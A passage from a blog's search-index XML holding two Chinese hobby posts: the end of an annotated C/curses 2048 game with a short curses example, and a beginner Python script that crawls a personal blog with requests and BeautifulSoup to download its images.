if((empty != old_empty) || (move == 1)) &#123; do&#123; new_x = rand() % 4; new_y = rand() % 4; &#125;while(a[new_y][new_x] != 0); // 标记随机产生数字为0的位置 cnt_value(&amp;new_y, &amp;new_x); do &#123; temp = rand() % 4; &#125;while(temp == 0 || temp == 2); a[new_y][new_x] = temp + 1; // 在找的的位置附上新的数字1或3 empty--; &#125; draw(); // 刷新页面 &#125;&#125;int cnt_one(int y, int x) // 查找该位置周围空位置的个数&#123; int value = 0; if(y - 1 &gt; 0) a[y-1][x] ? 0 : value++; if(y + 1 &lt; 4) a[y+1][x] ? 0 : value++; if(x - 1 &gt;= 0) a[y][x-1] ? 0 : value++; if(x + 1 &lt; 4) a[y][x+1] ? 0 : value++; if(y - 1 &gt;= 0 &amp;&amp; x - 1 &gt;= 0) a[y-1][x-1] ? 0 : value++; if(y - 1 &gt;= 0 &amp;&amp; x + 1 &lt; 4) a[y-1][x+1] ? 0 : value++; if(y + 1 &lt; 4 &amp;&amp; x - 1 &gt;= 0) a[y+1][x-1] ? 0 : value++; if(y + 1 &lt; 4 &amp;&amp; x + 1 &lt; 4) a[y+1][x+1] ? 0 : value++; return value;&#125;void cnt_value(int *new_y, int *new_x)&#123; int max_x, max_y, x, y, value; int max = 0; max = cnt_one(*new_y, *new_x); // 该数字为0的元素的周围空位置元素的个数 for(y = 0; y &lt; 4; y++) for(x = 0; x &lt; 4; x++) &#123; if(!a[y][x]) // 遍历其他数字为0的元素 &#123; value = cnt_one(y, x); if(value &gt; max &amp;&amp; old_y != y &amp;&amp; old_x != x) // 找到周围空位置元素最多的一个位置 &#123; *new_y = y; *new_x = x; old_x = x; old_y = y; break; &#125; &#125; &#125;&#125;int game_over()&#123; sleep(1); endwin(); exit(0);&#125; 肚子有点饿了，吃饭去了～～～～ 今天给代码增加了注释，对整个游戏的工作原理算是有了一个大致的了解，据说若果分数到达2048的时候，会有惊喜！！！！另外还对Linux图形界面编程库（curses库）有了一些了解。 这里有一个简单使用该库的例子。12345678910111213#include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;curses.h&gt; int main() &#123; initscr(); move( 15, 15 ); printw( "%s", "Hello world" ); refresh(); sleep(10); endwin(); exit(EXIT_SUCCESS);&#125;]]></content>
      <categories>
        <category>c++</category>
      </categories>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DIY python 1]]></title>
    <url>%2F2018%2F09%2F27%2FDIY-python-1%2F</url>
    <content type="text"><![CDATA[一个简单的爬虫一直想用爬虫来爬取一下别人网站上的自己喜欢的图片，正好最近又在学习网络爬虫的知识，所以就自己动手实践了一下。效果还不错^_^挑两张好看的图片先贴上 效果还不错吧。 放码过来123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from bs4 import BeautifulSoupimport requestsimport reimport urllibheaders = &#123;"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36" &#125;unseen = set()seen = sethome_page_url = "https://2heng.xin/"def get_page_url(page_url): try: print("page_url is " + page_url) html = requests.get(page_url, headers=headers) soup = BeautifulSoup(html.text, features="html.parser") url = soup.find("div", &#123;"id": "pagination"&#125;).find("a", href=re.compile("(^(https://2heng.xin/))")) page_url = url['href'] get_img_url(page_url) get_page_url(page_url) except: print("page_url finished!!")def get_img_url(cur_url): try: curhtml = requests.get(cur_url, headers=headers, stream=True) cursoup = BeautifulSoup(curhtml.text, features="html.parser") cururls = cursoup.find("div", &#123;"class": "site-content"&#125;).findAll("img", &#123;"class": "lazyload"&#125;) img_num = download_img(cururls) print(img_num) except: print("get_img_url finished!!!!")def download_img(img_urls): img_num = 0 for img_url in img_urls: img_num += 1 url = img_url['data-src'] try: r = requests.get(url, stream=True) img_name = url.split('/')[-1] with open('./img/MASHIRO/%s' % img_name, 'wb') as f: for chunk in r.iter_content(chunk_size=128): f.write(chunk) print("finished download " + url) except: print("this image have some problem!") return img_numget_page_url(home_page_url) 其实代码很简单，只不过这是我第一次动手来用代码帮自己完成一件事情，所以就把代码贴了出来。代码写的比较凌乱，如有错误还欢迎指正@-@]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
</search>
